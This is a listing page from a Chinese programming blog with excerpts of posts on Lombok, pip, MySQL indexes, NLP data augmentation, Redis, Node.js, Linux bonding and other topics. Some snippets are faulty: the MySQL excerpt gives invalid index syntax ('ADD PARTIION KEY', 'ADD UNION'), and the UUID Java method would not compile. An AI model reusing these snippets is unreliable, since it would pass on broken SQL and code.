		文章目录 一、简介二、示例比较1. Lombok 写法2. Java 标准写法 三、支持的配置项四、附属说明参考文献 一、简介 任何类的定义都可以用@EqualsAndHashCode来注释，让lombok生成equals(Object other)和hashCode()方法的实现。默认情况下，它将使用所有非静态、非瞬时的字段，但是你可以通过用@EqualsAndHashCode.Include或@EqualsAndHashCode.Exclude标记类型成员来修改哪些字段被使用（甚至指定各种方法的输出被使用）。另外，你可以通过用@EqualsAndHashCode.Include标记它们并使用@EqualsAndHashCode(onlyExplicitlyIncluded = true)来精确指定你希望使用的字段或方法。
如果将@EqualsAndHashCode应用于一个子类，这个功能就变得有点棘手了。通常情况下，为这类自动生成equals和hashCode方法是个坏主意，因为父类也定义了字段，这些字段也需要equals/hashCode代码，但这些代码不会被生成。通过设置callSuper为true，你可以在生成的方法中包含你的父类的equals和hashCode方法。对于hashCode，super.hashCode()的结果被包含在哈希算法中，而在equals，如果父类实现认为它不等于传入的对象，生成的方法将返回false。请注意，并非所有的equals实现都能正确处理这种情况。然而，lombok生成的equals实现会正确处理这种情况，所以如果你的父类也有一个lombok生成的equals方法，你可以安全地调用它。如果你有一个明确的父类，你将被迫为callSuper提供一些值，以确认你已经考虑了它；如果不这样做，将导致一个警告。
当你不扩展任何东西（其实扩展了java.lang.Object）时，将callSuper设置为true是一个编译时错误，因为它将使生成的equals()和hashCode()实现具有与简单地从java.lang.Object继承这些方法一样的行为：只有相同的对象才会互相相等，并且会有相同的hashCode。当你扩展另一个类时，不把callSuper设置为true会产生一个警告，因为除非父类没有（重要的）字段，否则lombok不能为你生成一个考虑到你的父类所声明的字段的实现。你需要编写你自己的实现，或者依靠callSuper的链式工具。你也可以使用lombok.equalsAndHashCode.callSuper配置键。
Lombok 0.10中的新内容：除非你的类是final并且扩展了java.lang.Object，否则lombok会生成一个canEqual方法，这意味着JPA代理仍然可以和他们的基类相等，但是添加新状态的子类不会破坏等价合约。本文将解释为什么需要这样一个方法的复杂原因：如何在Java中编写一个等价方法。如果一个层次结构中的所有类都是scala案例类和带有lombok生成的等价方法的类的混合体，那么所有的等价都会 “正常工作”。如果你需要写你自己的equals方法，如果你改变了equals和hashCode，你应该总是覆盖canEqual。
Lombok 1.14.0中的新增功能：要在equals(如果相关，还有canEqual)方法的另一个参数上添加注释，可以使用onParam=@_u({@AnnotationsHere})。不过要小心！这是一个实验特性。有关更多详细信息，请参阅有关onX功能的文档。
Lombok 1.18.16中的新内容：生成的hashCode()的结果可以通过设置cacheStrategy为CacheStrategy.NEVER以外的值进行缓存。如果注释类的对象可以以任何方式被修改，从而导致hashCode()的结果改变，请不要使用这个方法。
二、示例比较 1. Lombok 写法 import lombok.EqualsAndHashCode; @EqualsAndHashCode public class EqualsAndHashCodeExample { private transient int transientVar = 10; private String name; private double score; @EqualsAndHashCode.Exclude private Shape shape = new Square(5, 10); private String[] tags; @EqualsAndHashCode.Exclude private int id; public String getName() { return this.name; } @EqualsAndHashCode(callSuper=true) public static class Square extends Shape { private final int width, height; public Square(int width, int height) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90bd603916e2dc68e345e15c6921eaa7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23159a1e55be8f72c8b0291b477ba7a9/" rel="bookmark">
			飞鱼CRM如何同步数据到第三方系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		飞鱼CRM会自动收集字节广告渠道的销售线索，员工可以进行跟进，电话外呼等操作，但是如何将这些数据同步到企业的其他系统中，比如表单系统，CRM或者客服系统中呢？通集简云只需要轻松两步即可：
步骤1：Webhook 接收数据 选择Webhook下的接收数据作为触发动作
点击下一步，复制生成的Webhook URL地址
Webhook地址是一个接收数据的地址，只要向这个地址发送的数据就会被集简云系统获取，并且，集简云会自动解析收到的数据，这些数据可以用于触发后续的步骤。
复制这个生成的接收地址。
进入您的飞鱼CRM后台，找到 设置-&gt;API设置-&gt;线索推送规则-&gt;新建规则
在配置的第一步设置一个规则名称，点击下一步（字段默认是全部同步无需配置，后续可以自己调整）
在飞鱼设置的第二步将生成的Webhook URL地址粘帖到 http post url中
在筛选条件设置中设置满足推送数据的条件：
步骤3“设置数据发送格式“无需调整，直接点击下一步
步骤4：“设置返回格式”，
状态码：Code
消息key：Data
返回状态消息：null
步骤5 选择线上数据，选择一条进行测试
点击发送测试数据按钮
此时返回集简云的Webhook步骤，点击下一步，点击获取样本按钮
您将获取到飞鱼CRM发送来的样本数据
如果没有问题，则在飞鱼CRM最后一步保存设置，然后开启刚才设置的规则：
步骤2：选择您要同步的系统，比如CRM，客服系统等 在步骤中将飞鱼发送的线索字段选择对应的位置，即可按照您的配置进行不同系统间的数据同步。
配置完毕后，点击保存流程。这样每当有符合条件的飞鱼线索创建时，可以自动同步数据到您的其他系统中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a861e7a6279db43a3666d15ded6a821b/" rel="bookmark">
			这份 pip 使用方法，应该算是全网最全了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python 之所以如此受欢迎，能够在众多高级语言中，脱颖而出，除了语法简单，上手容易之外，更多还要归功于 Python 生态的完备，有数以万计的 Python 爱好者愿意以 Python 为基础封装出各种有利于开发的第三方工具包。
说到 pip ，大家都不会陌生。但我相信不少人，只是熟悉几个常用的用法，而对于其他几个低频且实用的用法，却知之甚少，这两天，我把这些用法整理了一下，应该是网络上比较全的介绍。
注：为方便 Python 技术交流，文末提供技术交流群
1. 查询软件包 查询当前环境安装的所有软件包
$ pip list 查询 pypi 上含有某名字的包
$ pip search pkg 查询当前环境中可升级的包
$ pip list --outdated 查询一个包的详细内容
$ pip show pkg 2. 下载软件包 在不安装软件包的情况下下载软件包到本地
$ pip download --destination-directory /local/wheels -r requirements.txt 下载完，总归是要安装的，可以指定这个目录中安装软件包，而不从 pypi 上安装。
$ pip install --no-index --find-links=/local/wheels -r requirements.txt 当然你也从你下载的包中，自己构建生成 wheel 文件
$ pip install wheel $ pip wheel --wheel-dir=/local/wheels -r requirements.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a861e7a6279db43a3666d15ded6a821b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c9e206284a25caf4c7b46bfd5daa449/" rel="bookmark">
			MySQL中创建四种不同类型索引的方法：
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 MySQL中创建四种不同类型索引的方法：
1、添加主键
alter table tbl_name ADD PARTIION KEY (col_list); //该语句添加一个主键，这意味着索引必须是唯一的，且不能为NULL. 2、添加唯一索引
ALTER TABLE tbl_name ADD UNION index_name (col_list); //这条语句创建索引的值必须是唯一的 3、添加普通索引
alter table tbl_name add index index_name (col_list); //添加普通索引，索引值可能出现多次 4、添加全文索引
alter table tbl_name add fulltext index_name (col_list); //该语句指定了索引为FULLTEXT,用于全局索引。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/942b3b4df0117ebb1669d470dabf3b31/" rel="bookmark">
			一篇就够！数据增强方法综述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者 | 太子长琴 整理 | NewBeeNLP
数据增强(Data Augmentation, DA)缓解了深度学习中数据不足的场景，在图像领域首先得到广泛使用，进而延伸到 NLP 领域，并在许多任务上取得效果。一个主要的方向是增加训练数据的多样性，从而提高模型泛化能力。
今天分享一篇全面和结构化的数据增强综述，将 DA 方法基于增强数据的多样性分成三类：释义、噪声和采样，分别进行详细分析，另外也介绍了它们在 NLP 任务中的应用和挑战。
论文：Data Augmentation Approaches in Natural Language Processing: A Survey[1]
简介 数据增强指通过对已有数据添加微小改动或从已有数据新创建合成数据，以增加数据量的方法。因为 NLP 的离散型，所以应用起来相对较难。
paraphrasing-based 方法：生成原始数据的释义作为增强数据。有限的语义不同，与原始数据很相近。
noise-based 方法：保证结果有效的前提下对原始数据增加噪声。提升模型鲁棒性。
sample-based 方法：掌握原始数据的分布，采样新数据作为增强数据。基于人工启发式和训练模型输出更多样化的数据并满足下游任务的更多需求。
NLP中的数据增强方法 基于释义的方法 释义的重点是使增强数据的语义尽可能与原始数据相似。可能出现在多个层次：词汇、短语和句子。
同义词 做法一：对每个句子获取所有可替换的词，并随机选择 r 个进行替换，与原始词越像越有可能被选择。
做法二：EDA，随机选择 n 个非停用词，随机选择每个词的同义词进行替换。
做法三：使用上位词替换原始词，按照难度从高到低的顺序推荐了可用作词替换的候选词类型：副词、形容词、名词和动词。
语义嵌入 做法一：使用预训练的词向量找近义词：Glove、Word2Vec、FastText 等。
做法二：同时使用词向量和语义帧向量。
语言模型 做法一：将词 Token 化成词片段，如果片段不是完整的词，使用词向量构建候选集，否则使用MLM，然后按 0.4 的概率决定每个片段是否被候选集中一个随机词替换。
做法二：Mask 多个词然后用模型预测生成，有时候也会用 RNN 生成。
语法规则 做法一：使用现有的词典或固定的启发式方法来生成词级和短语级的释义，如缩写、动词、情态动词和否定词的原型等。
做法二：用一些规则为原始句子生成句子级的释义，如依存关系树。也就是句子结构变了但语义不变（类似把字句改成被字句）。
机器翻译 做法一：回译。
回译+系列 softmax 温度设置，以确保多样性，同时保留语义。
回译+对抗训练，通过有机地集成多个转换来合成多样化和信息丰富的增强数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/942b3b4df0117ebb1669d470dabf3b31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60656f4dbe1e917e426d9a6e32f0861d/" rel="bookmark">
			【C&#43;&#43;笔记：例题】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一： /*
请编写程序统计每种不同的个位数字出现的次数。例如：给定 N=100311，则有 2 个 0，3 个 1，和 1 个 3。*/
#include&lt;iostream&gt;
#include&lt;string.h&gt;
using namespace std;
int main()
{
string num;
int i,j,n,a[10]={0},k;
cin&gt;&gt;num;
n=num.length();
for(i=0;i&lt;n;i++)
{
k=num[i]-'0';
a[k]+=1;
}
for(j=0;j&lt;10;j++)
{
if(a[j]!=0)
{
cout&lt;&lt;j&lt;&lt;":"&lt;&lt;a[j]&lt;&lt;endl;
}
}
return 0;
}
1.1：求string型长度 用string的成员方法length()获取字符串长度, length()比较直观,表示的就是该字符串的长度。
str.length ()
(2)用string的成员方法size()获取字符串长度
size()表示的是字符串这个容器中的元素个数。如果使用过std::vector之类的容器的话,可以把字符串看做是一个vector&lt;char&gt;(这里只是举的例,并不能等价),字符就是这个容器的元素类型。那么size()表示的就是这个向量(容器)中字符的个数。
str.size ()
(3)用strlen获取字符串长度
strlen同样也可以用于c++的字符串。但是需要用c-str()将c++字符串转换为char *类型。
len = str.length ();
1.2: k=num[i]-'0';
num[i]为字符型，减去一个字符‘0’可得对应的整数
二： #include&lt;bits/stdc++.h&gt;
using namespace std;
long long gbs(long long a,long long b) //求公倍数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60656f4dbe1e917e426d9a6e32f0861d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8e92b2fe2f5a24313d6beb6e26dba3a/" rel="bookmark">
			monocle3包分析单细胞转录组数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 构建new_cell_data_set对象 Usage new_cell_data_set(expression_data, cell_metadata = NULL, gene_metadata = NULL) Arguments expression_data expression data matrix for an experiment, can be a sparseMatrix.
cell_metadata data frame containing attributes of individual cells, where row.names(cell_metadata) = colnames(expression_data).
gene_metadata data frame containing attributes of features (e.g. genes), where row.names(gene_metadata) = row.names(expression_data).
# 设置工作目录 setwd("your/working/path") # 载入包 library(monocle3) # packageVersion('monocle3') # monocle版本 # ls("package:monocle3") library(ggplot2) library(dplyr) # 1.分别读入表达矩阵，细胞注释数据框以及基因注释数据框，并构建new_cell_data_set对象 # Load the data expression_matrix &lt;- readRDS(url("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8e92b2fe2f5a24313d6beb6e26dba3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d835c67751e52b3d8d58144b480589f/" rel="bookmark">
			django模型外键自动加‘_id’
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总所周知！django的模型里有外键列
例如：
worklist_tag = models.ForeignKey(WorkListTag, related_query_name='worklist_tag', blank=False, on_delete=models.SET_NULL) 但是这个字段真正对应的数据库字段是worklist_tag_id，会自动加上_id，而当我们数据库里外键不是以_id结尾的话，就永远匹配不到。
所以这时候就需要在他的属性中加入
db_column='worklist_tag' 这样字段名就匹配上了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e2667151f25ed9bec1076d91a5dd7c1/" rel="bookmark">
			janus流媒体服务器搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准备ubuntu20 虚拟机
注意：切换root用户 sudo su，否则以下很多命令要加sudo；
linux新版本推荐apt（低版本apt-get还能用）
一 安装工具
apt install git
apt install make
apt install nginx
apt install python
apt install net-tools
二 安装janus依赖库
apt install libmicrohttpd-dev
apt install libjansson-dev
apt install libssl-dev
apt install libsofia-sip-ua-dev
apt install libglib2.0-dev
apt install libopus-dev
apt install libogg-dev
apt install libcurl4-openssl-dev
apt install liblua5.3-dev
apt install libconfig-dev
apt install pkg-config
apt install gengetopt
apt install libtool
apt install automake
apt install libwebsockets-dev
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e2667151f25ed9bec1076d91a5dd7c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01d7b83781cbb01145b771212d7ae74c/" rel="bookmark">
			allegro走线层切换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作方法1：
allegro的PCB层相当复杂，在布线、放置元件时，往往想要单独显示某一层或者同时显示几个层，若每次操作都进行切换，太过浪费时间。其实可以利用artwork的功能，预先设置几个层的集合，想要切换时，只需要在visibility中的views栏选择即可。
操作步骤：
1.1 点击菜单栏manufacture-&gt;artwork进行artwork
1.2 点击Display-&gt;Color/Visibility，选择想要显示的层
1.3 在artwork弹窗中空白处右键add，输入层集名字，点ok
1.4 在visibility中的views栏，点击下拉后可以看到设好的层集，方便快捷
方法2：
2.1 安装插件工具 Vincent_skill V1.6 2.2 会在allegro 增加菜单 Vincent_skill V1.6 2.3 Vincent_skill V1.6 -&gt; setup -&gt; Gerber Artwrok..... 2.4 工具会自动生成 快捷图层 ；
一、适用Allegro版本：
本工具可在Allegro16.6和Allegro17.2版本中正常使用，不完全兼容Allegro17.4版本。Allegro16.6可支持中文菜单，Allegro17.2 不支持中文菜单。
二、安装步骤：
在当前路径下双击程序或右键以管理员权限运行 "Vincent Skill V1.6 安装.exe" 即可一键安装完成。
三、更新内容：
1、优化--对齐pin功能，可以选择X/Y方向对齐，也可以多次循环选择对齐。 2、优化--检查REF文字方向 增加了Change选项，不满足check要求的自动更改方向; 3、增加--自动添加PCB项目中Ref des/Value层缺失文字信息; 4、增加--在command 输入 g+空格+数字，即可设置格点大小; 5、增加--在command 输入 l+空格+数字，即可显示对应层信息;
6、增加--自动创建差分对
7、增加--自动摆放ref位号丝印
8、增加--网表转换工具
9、增加--保存BRD文件名字附加当前时间
10、增加--自动checklist工具
11、增加--快速创建封装
12、增加--快速设置封装Symbol原点
13、增加--自动添加Outline尺寸标注
14、增加--快速添加封装Pin Number Text丝印 15、增加--快速添加drill层 加工工艺层叠阻抗
16、增加--快速设置层叠
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01d7b83781cbb01145b771212d7ae74c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/362b115d3d1be32d14435c48428e3393/" rel="bookmark">
			bond模式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 bond模式详解 一、什么是bond？二、为什么使用bond？三、bond模式配置 1、配置linux bond a)、加载bonding模块b)、配置bond 同样的修改物理网卡，em2.2、将bond绑定到ovs上面（可选） a)、前置条件b)、配置网卡四、bond模式 1、模式02、模式13、模式24、模式35、模式46、模式57、模式6五、如何选择bond 模式 一、什么是bond？ CentOS7系统可以将多个网络接口绑定在一起，来作为单一的接口去给上层应用使用。
二、为什么使用bond？ bong可以将多个网卡绑定到一起，可以让两个或多个接口作为一个接口，同时提高带宽，并提供网络链路的冗余，当有其中一块网卡故障的时候，不会中断服务器的业务。
三、bond模式配置 1、配置linux bond a)、加载bonding模块
# 对于CentOS系统默认会加载bonding模块，我们也可以使用root用户手动加载模块** # 临时加载模块，重启失效。 modprobe --first-time bonding # 永久加载模块 modprobe bonding # 查看模块信息 modinfo bonding b)、配置bond
b-1)、创建bond接口，在 /etc/sysconfig/network-scripts/ 目录中创建名为 ifcfg-bondN 的文
件，使用接口号码替换 N，比如 0
### 创建bond接口 # vim /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0 //和文件名中的ifcfg-bond0中的bond0是一致的。 NAME=bond0 //设备名字，为了NetworkManage方便管理，和DEVICE保持一致 TYPE=Bond //TYPE要设置成Bond，表示该接口为bond接口 BONDING_MASTER=yes IPADDR=192.168.1.1 PREFIX=24 ONBOOT=yes BOOTPROTO=none BONDING_OPTS="mode=4 miion=100" //bond选项，引号里面的内容，需要配置，这里配置了之后，就不需要配置 b-2)、修改物理接口的配置文件
### vim /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1 ONBOOT=yes HOTPLUG=no NM_CONTROLLED=no PEERDNS=no MASTER=bond0 // SLAVE=yes // BOOTPROTO=none 同样的修改物理网卡，em2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/362b115d3d1be32d14435c48428e3393/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/621362ab8fbf22f6a62ccab456a5feea/" rel="bookmark">
			PAT乙级刷题/1044 火星数字/C&#43;&#43;实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目描述
火星人是以 13 进制计数的：
地球人的 0 被火星人称为 tret。地球人数字 1 到 12 的火星文分别为：jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec。火星人将进位以后的 12 个高位数字分别称为：tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou。 例如地球人的数字 29 翻译成火星文就是 hel mar；而火星文 elo nov 对应地球数字 115。为了方便交流，请你编写程序实现地球和火星数字之间的互译。
输入格式： 输入第一行给出一个正整数 N（&lt;100），随后 N 行，每行给出一个 [0, 169) 区间内的数字 —— 或者是地球文，或者是火星文。
输出格式： 对应输入的每一行，在一行中输出翻译后的另一种语言的数字。
输入样例： 4 29 5 elo nov tam //结尾无空行 输出样例： hel mar may 115 13 //结尾无空行 二、思路分析
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/621362ab8fbf22f6a62ccab456a5feea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f06af84568935d2b1fc1713975ddf8c/" rel="bookmark">
			产品设计方法论，用户体验五要素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全文共 2024 字，阅读需要 10 分钟
前言：
很多产品人在设计或重构产品时，脑子里有很多想法，却不知从何开始，今天老虞介绍的用户体验五要素正为我们做产品提供了方向。用户体验五要素是一种产品分析与设计的方法论，可以帮助我们以正确方式从0到1设计一款产品。接下来老虞带大家一起了解～
· ONE ·
是什么？
1.表现层
所谓表现层，是我们直观看到一个页面时的组成判断。一个页面由图片和文字组成。有些图片和文字是可点击的，从而可以执行对应的某些功能；有些是不可点击的，仅仅就只是图片和文字而已，用来展示或者营销用。但是每一个设计都会对产品体验产生重要的影响。
2.框架层
在产品的表现层下，就蕴藏着产品的框架层：按钮、控件、照片、文本区域的位置。框架层是用于优化设计布局的。以达到各个元素的最大效果与效率。比如你在使用某个app时，可以轻而易举的找到你想要找到的某个功能。这种布局就是框架层来决定的。
3.结构层
结构层相对于框架层是更加抽象的，框架仅仅是结构的表达。框架层确定了在各个页面在交互元素上的位置，结构层则是用来设计用户如何到达某个页面。并且要考虑他们完成事情之后能够去哪里。框架层决定了导航栏的各个功能的排列方式，允许用户来浏览页面的各个模块；结构层则决定这些类别的功能应该出现在哪里。
4.范围层
结构层确定页面各种特性和功能最适合的组合方式，而这些特性和功能就构成了产品的范围层。比如电商应用提供了一个功能，这个功能（包括任何一个功能点）是否应该成为应用的功能之一，这就属于范围层要解决的问题。
5.战略层
产品的范围层，基本上是由产品的战略层决定的。这些战略不仅仅是经营者想要得到什么，还包括了产品的用户想要得到什么。就一家电商公司而言，经营者想要通过产品售卖商品，而用户想要从该产品上购买商品。而对于另外一些目标（如用户填写的信息在商务模版中扮演的角色），则没有那么容易说的清楚。
· TWO ·
各司其职？怎么做？
1.表现层
到了表现层，UI设计师会根据产品的战略，功能，以及内容，根据市场的调研分析，使用人群等来判断这块产品从视觉上要传达给用户什么样的设计感觉出来，比如专业的，亲民接地气的，高大上的，二次元的等视觉表现形式.在设计当中利用颜色及空间划分视觉层级，通过不同平台思考设计表现形式，梳理控件样式形成规范性及统一性.整体视觉样式尽量做减法，让用户轻松看到核心内容以及核心操作。
2.框架层
我们通过框架层的定义，这时候就可以开始细化页面的信息框架了.交互设计师在设计交互流程图的时候会考虑很多的设计点，如何将功能信息有效的组织起来，信息之间的关系如何排布，在当前的场景下应该使用什么样的交互控件，功能样式统一性，用户使用起来是否方便，前后之间的逻辑等问题，交互流程图是需要反复思考和验证的。
3.结构层
有了战略级目标和产品的核心功能，这时候我们要在结构层里梳理出产品功能的信息框架，按照战略强相关的功能优先展示，哪个页面该展示哪些功能，以及展示的顺序和大体的流程.交互设计师把控信息架构的合理性，以及前后关系操作起来是否高效。
4.范围层
当把用户需求和产品目标转变成产品应该提供给用户什么样的内容和功能时，战略就变成了范围层。定义项目范围包含2个方面，即产品功能和产品内容，功能与内容针对不同类型的产品，有的是2者都重要，有的更重功能，有的更重内容，根据产品战略，它们的权重是不一样的。
5.战略层
开始做设计前要先想清楚这两件事情。怎么样引导用户达成用户目标从而完成公司战略目标，只有当用户实现了目标公司才能实现战略目标。
· THREE ·
总结
以上是老虞对于用户体验核心五要素的梳理，希望能够为大家带来一些启发。
随着国内互联网企的发展沉淀，用户体验模块也会变得异常重要。在残酷的市场竞争中，产品体验的差异有时对于产品本身而言将会是致命的。尤其是在牵涉到使用的核心环节，比如支付环节体验很差，将是产品终结的罪魁祸首。
同时，互联网企业也应该对于用户体验保持好克制，不可一味的盲从。因为随便一个人，对于界面设计提出几个改进问题，那个过程距离产品体验开发过程相差甚远，当然可以说那是其中一个环节。直接从表现层开始，那必定是把产品推向了一个危险境地。
希望这些也能带来大家的思考，尤其是从事互联网行业的每一位。都要扎实的去挖掘有价值的信息来进行自我赋能，通过提升自我思维高度来保证项目的高效运转。当然事实是并不是你努力就一定能够达到的，可是不努力你肯定是最快被淘汰的。希望每一位互联网从业者慎重选择，谨记得过且过最终会是一无所获。
大厂产品经理资料100套
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ea8929eac69ab44092261fa588a8e1a/" rel="bookmark">
			uuid生成纯数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public static String getUUID(){ return UUID.randomUUID().toString().replace("-",""); } public static Integer getUUIDInOrderId(){ for (int i = 0; i&lt;100; i++){ Integer orderId=UUID.randomUUID().toString().hashCode(); orderId = orderId &lt; 0 ? -orderId : orderId; //String.hashCode() 值会为空 } return orderId; } 但这有两个问题都不能保证生成的数字像uuid一样唯一
1.既然是数字在逻辑运算的时候肯定有重复的可能性
2.转换为hascode时会产生碰撞生成相同的hashcode
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77de4f6c190c5e24a6c8f99520b54fe9/" rel="bookmark">
			[NodeJs] 如何获取项目的根路径？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[NodeJs] 如何获取项目的根路径？ __dirname,
process.cwd()
个人简介 我是歌谣，欢迎和大家一起交流前后端知识。放弃很容易，
但坚持一定很酷。欢迎大家一起讨论
主目录 与歌谣一起通关前端面试题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cbab683be0126f01d5ed25031920dcf/" rel="bookmark">
			[NodeJs] 你有使用过npx吗？它主要解决什么问题？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[NodeJs] 你有使用过npx吗？它主要解决什么问题？ npm从5.2开始增加了npx命令
node自带npm模块,npx命令可以直接使用,如果不能使用,需自行安装.
$ npm install -g npx
npx 的原理很简单，就是运行的时候，会到node_modules/.bin路径和环境变量$PATH里面，检查命令是否存在。
主要解决问题:
切换node版本在命令行下,调用内部安装模块避免全局安装模块执行github上模块代码(前提:远程代码必须是一个模块，即必须包含package.json和入口脚本) 个人简介 我是歌谣，欢迎和大家一起交流前后端知识。放弃很容易，
但坚持一定很酷。欢迎大家一起讨论
主目录 与歌谣一起通关前端面试题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d07116e58f1bf34adf4fd3b9ca1581dd/" rel="bookmark">
			[NodeJs] 如果发现node_modules中有个模块代码有bug，你该怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[NodeJs] 如果发现node_modules中有个模块代码有bug，你该怎么办？ 删除node_modules文件夹 重新npm install
如果本身代码有问题，去github对应的模块库提issues
个人简介 我是歌谣，欢迎和大家一起交流前后端知识。放弃很容易，
但坚持一定很酷。欢迎大家一起讨论
主目录 与歌谣一起通关前端面试题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c0649114d3004efbd3874918ce795ce/" rel="bookmark">
			Redis知识详解（由浅入深，满足你对Redis的基本能理解和操作）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Redis的简介1.1 Redis基本信息1.2 Redis的优点1.3 Redis的8个应用场景1.4 Redis是单线程 二、Redis的基本操作1 select:2 dbsize:3 keys4 flushdb5 flushall 三、Redis基于基本数据类型的命令String：字符串1 set2 get3 exists4 append5 strlen6 incr &amp; decr7 incrby &amp; decrby8 setrange &amp; getrange9 setex &amp; ttl10 setnx11 mset &amp; mget12 getset Hash:哈希1 hset &amp; hget2 hmset &amp; hmget3 hgetall4 hdel5 hlen6 hexists7 hkeys &amp; kvals8 hincrby9 hsetnx List ：列表1 lpush &amp; rpush &amp; lrange2 lpop &amp; rpop3 lindex4 llen5 lrem6 ltrim7 rpoplpush8 lset9 linsert set:集合1 sadd2 smembers3 sismember4 scard5 srem6 srandmember7 spop8 smove9 sinter &amp; sunion &amp; sdiff SortSet:有序集合1 zadd2 zrangebyscore3 zrem4 zcard5 zcount 四、应用场景1 缓存2 数据共享3 分布式锁4 全局ID5 计数器6 限流7 Top问题8 消息队列9 用户关注，推荐模型10 排行榜 五、Redis特殊类型1 geoadd &amp; geopos2 geodist3 georadius4 georadiusbymember 六、Redis持久化1 RDB1 save2 bgsave2 触发RDB方式优点缺点 AOF(Append Only File)日志文件AOF回写策略优点缺点 七、Redis事务1 Redis事务机制 八、Redis内存淘汰机制1 内存维护的解决方案2 过期策略3 内存淘汰机制 九、Redis缓存数据一致性及问题1 保证缓存和数据库数据一致性2 缓存问题1 缓存穿透（查不到）2 缓存击穿（量太多）3 缓存雪崩 十、Redis高可用1 主从复制复制原理主从复制配置 哨兵模式哨兵模式的内容工作过程哨兵原理哨兵故障修复原理 一、Redis的简介 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c0649114d3004efbd3874918ce795ce/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/271/">«</a>
	<span class="pagination__item pagination__item--current">272/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/273/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>